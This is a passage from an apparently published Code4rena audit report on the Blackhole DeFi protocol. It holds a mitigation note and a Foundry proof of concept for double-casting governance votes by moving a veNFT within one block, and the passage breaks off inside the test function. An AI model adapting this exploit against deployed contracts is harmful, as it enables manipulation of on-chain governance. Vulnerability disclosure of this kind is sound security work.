<h3 style="position:relative;" id="recommended-mitigation-steps-18"><a class="anchor before" aria-label="recommended mitigation steps 18 permalink" href="#recommended-mitigation-steps-18"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Perform a check just like in <code>VotingEscrow::balanceOfNFT</code> whether ownership was changed in the current block number.</p>
<h3 style="position:relative;" id="proof-of-concept-12"><a class="anchor before" aria-label="proof of concept 12 permalink" href="#proof-of-concept-12"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>This POC is written in foundry, in order to run it, one has to create foundry project, download dependencies, create remappings and change imports in some of the file to look inside the “src” folder</p>
<p>The POC is the simple version of the finding, in order to run it one has to first change the code of the Governor, so that other vulnerability in the code is fixed, as without that change proposals DO NOT WORK. Look at the <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-163"><code>getVotes</code> inside the <code>BlackGovernor</code> incorrectly provides <code>block.number</code> instead of <code>block.timestamp</code>, leading to complete DOS of proposal functionality</a> finding.</p>
<p>This POC is not perfect, as it utilizes also vulnerability found in <code>getsmNFTPastVotes</code> (finding that if provided timestamp to the function is smaller than the timestamp of the first checkpoint, function evaluates <code>tokenIds</code> from the first checkpoint) that is also submitted. However, if one would create a contract that casts a vote at <code>voteStart</code> timestamp, transfers NFT to another attacker controlled smart contract, the outcome will be the same.</p>
<pre data-index="68" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">pragma</span><span class="mtk1"> </span><span class="mtk12">solidity</span><span class="mtk1"> ^</span><span class="mtk7">0.8</span><span class="mtk1">.</span><span class="mtk7">13</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">Test</span><span class="mtk1">, </span><span class="mtk12">console</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"forge-std/Test.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">Black</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/Black.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">MinterUpgradeable</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/MinterUpgradeable.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">RewardsDistributor</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/RewardsDistributor.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">PermissionsRegistry</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/PermissionsRegistry.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">TokenHandler</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/TokenHandler.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">VoterV3</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/VoterV3.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">VotingEscrow</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/VotingEscrow.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">AutoVotingEscrowManager</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/AVM/AutoVotingEscrowManager.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">GaugeManager</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/GaugeManager.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">PairGenerator</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/PairGenerator.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">GaugeFactory</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/factories/GaugeFactory.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">PairFactory</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/factories/PairFactory.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">GaugeFactoryCL</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/AlgebraCLVe33/GaugeFactoryCL.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">BlackGovernor</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/BlackGovernor.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">IBlackHoleVotes</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/interfaces/IBlackHoleVotes.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">IMinter</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/interfaces/IMinter.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">DoubleVoteTest</span><span class="mtk1"> </span><span class="mtk12">is</span><span class="mtk1"> </span><span class="mtk12">Test</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">Black</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">black</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">RewardsDistributor</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">rewardsDistributor</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">MinterUpgradeable</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">minterUpgradeable</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">PermissionsRegistry</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">permissionsRegistry</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">TokenHandler</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">tokenHandler</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">AutoVotingEscrowManager</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">avm</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">VotingEscrow</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">votingEscrow</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">VoterV3</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">voter</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">GaugeManager</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">gaugeManager</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">GaugeFactory</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">gaugeFactory</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">PairGenerator</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">pairGenerator</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">PairFactory</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">pairFactory_1</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">PairFactory</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">pairFactory_2CL</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">GaugeFactoryCL</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">gaugeFactoryCL</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">BlackGovernor</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">blackGovernor</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">admin</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0xAD</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">protocol</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0x1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">userA</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0xA</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">userB</span><span class="mtk1"> = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0xB</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">setUp</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">admin</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">Black</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">permissionsRegistry</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">PermissionsRegistry</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">string</span><span class="mtk1"> </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">GARole</span><span class="mtk1"> = </span><span class="mtk11">string</span><span class="mtk1">(</span><span class="mtk11">bytes</span><span class="mtk1">(</span><span class="mtk8">"GAUGE_ADMIN"</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">permissionsRegistry</span><span class="mtk1">.</span><span class="mtk11">setRoleFor</span><span class="mtk1">(</span><span class="mtk12">admin</span><span class="mtk1">, </span><span class="mtk12">GARole</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">tokenHandler</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">TokenHandler</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">permissionsRegistry</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">voter</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">VoterV3</span><span class="mtk1">();</span><span class="mtk3">//needs to be initialized</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">avm</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">AutoVotingEscrowManager</span><span class="mtk1">();</span><span class="mtk3">//needs to be initialized</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">votingEscrow</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">VotingEscrow</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">black</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk7">0</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">avm</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">   </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">rewardsDistributor</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">RewardsDistributor</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeFactoryCL</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">GaugeFactoryCL</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeFactoryCL</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">permissionsRegistry</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeFactory</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">GaugeFactory</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairGenerator</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">PairGenerator</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory_1</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">PairFactory</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory_1</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">pairGenerator</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory_2CL</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">PairFactory</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">pairFactory_2CL</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">pairGenerator</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">gaugeManager</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">GaugeManager</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeManager</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">tokenHandler</span><span class="mtk1">),</span><span class="mtk11">address</span><span class="mtk1">( </span><span class="mtk12">gaugeFactory</span><span class="mtk1">),</span><span class="mtk11">address</span><span class="mtk1">( </span><span class="mtk12">gaugeFactoryCL</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">pairFactory_1</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">pairFactory_2CL</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">permissionsRegistry</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">avm</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">),</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">voter</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">rewardsDistributor</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">minterUpgradeable</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">MinterUpgradeable</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">minterUpgradeable</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">gaugeManager</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">rewardsDistributor</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">blackGovernor</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">BlackGovernor</span><span class="mtk1">(</span><span class="mtk11">IBlackHoleVotes</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeManager</span><span class="mtk1">.</span><span class="mtk11">setBlackGovernor</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">blackGovernor</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">voter</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">VoterV3</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">voter</span><span class="mtk1">.</span><span class="mtk11">initialize</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">tokenHandler</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">gaugeManager</span><span class="mtk1">), </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">permissionsRegistry</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">rewardsDistributor</span><span class="mtk1">.</span><span class="mtk11">setDepositor</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeManager</span><span class="mtk1">.</span><span class="mtk11">setVoter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">voter</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">gaugeManager</span><span class="mtk1">.</span><span class="mtk11">setMinter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1">.</span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">admin</span><span class="mtk1">, </span><span class="mtk7">10_000_000e18</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1">.</span><span class="mtk11">setMinter</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">));</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">stopPrank</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">test_doubleSpendCastVote</span><span class="mtk1">() </span><span class="mtk11">public</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">admin</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">claimants</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">amounts</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">minterUpgradeable</span><span class="mtk1">.</span><span class="mtk11">_initialize</span><span class="mtk1">(</span><span class="mtk12">claimants</span><span class="mtk1">, </span><span class="mtk12">amounts</span><span class="mtk1">, </span><span class="mtk7">0</span><span class="mtk1">);</span><span class="mtk3">//zero % ownership of top protcols</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">userABal</span><span class="mtk1"> = </span><span class="mtk7">1_000_000e18</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1">.</span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">userA</span><span class="mtk1">, </span><span class="mtk12">userABal</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">stopPrank</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">userA</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">black</span><span class="mtk1">.</span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">votingEscrow</span><span class="mtk1">), </span><span class="mtk11">type</span><span class="mtk1">(</span><span class="mtk12">uint</span><span class="mtk1">).</span><span class="mtk12">max</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">votingEscrow</span><span class="mtk1">.</span><span class="mtk11">create_lock</span><span class="mtk1">(</span><span class="mtk7">1_000_000e18</span><span class="mtk1">, </span><span class="mtk7">4</span><span class="mtk1"> * </span><span class="mtk7">365</span><span class="mtk1"> </span><span class="mtk12">days</span><span class="mtk1">, </span><span class="mtk4">true</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">skip</span><span class="mtk1">(</span><span class="mtk7">3600</span><span class="mtk1">); </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">targets</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">address</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">values</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">uint256</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
